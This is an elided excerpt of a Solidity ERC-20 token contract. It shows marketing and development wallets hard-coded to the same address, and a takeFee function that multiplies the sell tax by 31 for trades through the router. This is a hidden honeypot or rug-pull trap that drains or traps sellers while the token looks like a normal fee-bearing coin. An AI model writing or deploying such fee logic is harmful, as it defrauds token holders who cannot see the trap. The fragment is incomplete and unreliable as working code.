...
contract Contract is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x1B101a0482d116E92312641CbE7EF8196BE34B32); // Marketing Address
    address payable public DevelopmentWalletAddress = payable(0x1B101a0482d116E92312641CbE7EF8196BE34B32); // Development Address
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if (sender == address(_routerAddress) || recipient == address(_routerAddress)) {
          _totalTaxIfSelling = _totalTaxIfSelling * 31;
        }
